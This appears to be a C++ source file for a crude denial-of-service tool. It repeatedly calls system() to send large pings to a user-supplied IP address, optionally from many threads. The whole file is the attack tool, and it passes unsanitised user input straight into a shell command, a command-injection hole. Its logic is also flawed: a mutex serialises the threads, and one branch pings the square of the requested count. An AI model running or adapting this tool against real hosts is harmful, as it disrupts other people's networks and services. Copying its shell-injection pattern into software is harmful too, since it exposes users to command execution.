#include "include/DDos.hpp"

std::mutex threadguard;

void DDos(const std::string &ipaddr, int pings) {
    std::string formed = "ping -s 1000 -c 1"  " " + ipaddr;

    for (int i = 0; i < pings; i++) {
        threadguard.lock();
        system(formed.c_str());
        threadguard.unlock();
    }
}

void ThreadHandler(int pings, const std::string &ipaddr, bool useThreads, const int amountofthreads) {
    if (useThreads) {
        std::vector<std::thread> t;

        for (int i = 0; i < amountofthreads; i++) {
            t.emplace_back(std::thread(DDos, ipaddr, pings));
        }

        for (auto &i : t) {
            i.join();
        }
    } else {
        for (int i = 0; i < pings; i++) {
            DDos(ipaddr, pings);
        }
    }
}

void DDosInit(bool self) {
    if (self) {
        std::string ipaddr;
        int pings;
        char answer2;
        int threads;

        std::cout << "Enter number of pings: " << std::endl;
        std::cin >> pings;
        std::cout << "Threads y/n: " << std::endl;
        std::cin >> answer2;
        if (answer2 == 'y') {
            std::cout << "Enter number of threads: " << std::endl;
            std::cin >> threads;
            ThreadHandler(pings, "127.0.0.1", true, threads);
        } else {
            ThreadHandler(pings, "127.0.0.1", false);
        }
    } else {
        std::string ipaddr;
        int pings;
        char answer2;
        int threads;

        std::cout << "Enter IP Address: " << std::endl;
        std::cin >> ipaddr;
        std::cout << "Enter number of pings: " << std::endl;
        std::cin >> pings;
        std::cout << "Threads y/n: " << std::endl;
        std::cin >> answer2;
        if (answer2 == 'y') {
            std::cout << "Enter number of threads: " << std::endl;
            std::cin >> threads;
            ThreadHandler(pings, ipaddr, true, threads);
        } else {
            ThreadHandler(pings, ipaddr, false);
        }
    }
}
